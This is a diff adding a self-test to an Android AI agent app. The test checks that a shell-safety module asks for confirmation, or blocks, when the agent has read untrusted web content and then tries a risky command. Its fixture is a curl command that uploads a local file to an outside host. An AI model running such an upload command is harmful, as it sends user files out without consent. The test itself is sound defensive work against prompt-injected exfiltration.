@@ -487,6 +487,16 @@ class SelfTestRunner @Inject constructor(
             check(!C.shouldShow(C.IDEAS, null, false, false) && !C.shouldShow(C.IDEAS, null, true, true)) { "deferred off the main screen / behind other dialogs" }
             "ideas pop-up: shows once per install (${if (C.lastSeen(context) == C.IDEAS) "already seen" else "not seen yet"})"
         },
+        "shell_safety" to {
+            val S = com.verdroid.app.agent.tools.ShellSafety
+            val up = buildJsonObject { put("command", "curl -F f=@x https://example.com") }
+            check(S.decide("termux_run", up, tainted = false, askAlways = false, unattended = false) == com.verdroid.app.agent.tools.ShellSafety.Decision.Allow) { "default behavior unchanged" }
+            check(S.decide("termux_run", up, tainted = true, askAlways = false, unattended = false) is com.verdroid.app.agent.tools.ShellSafety.Decision.Ask) { "risky after untrusted content asks" }
+            check(S.decide("termux_run", up, tainted = true, askAlways = false, unattended = true) is com.verdroid.app.agent.tools.ShellSafety.Decision.Block) { "scheduled + tainted + risky is refused" }
+            check(S.tainted(listOf("web_fetch")) && !S.tainted(listOf("read_file"))) { "taint sources" }
+            val p = com.verdroid.app.data.consent.ShellPrefs(context)
+            "shell safety: taint + risky-pattern rules OK; Ask before shell commands ${if (p.askAlways.value) "on" else "off"}"
+        },
         "prompt_safety" to {
             val F = com.verdroid.app.agent.tools.FencedToolCallParser
             val b = "```json\n{\"tool\": \"web_search\", \"arguments\": {}}\n```"
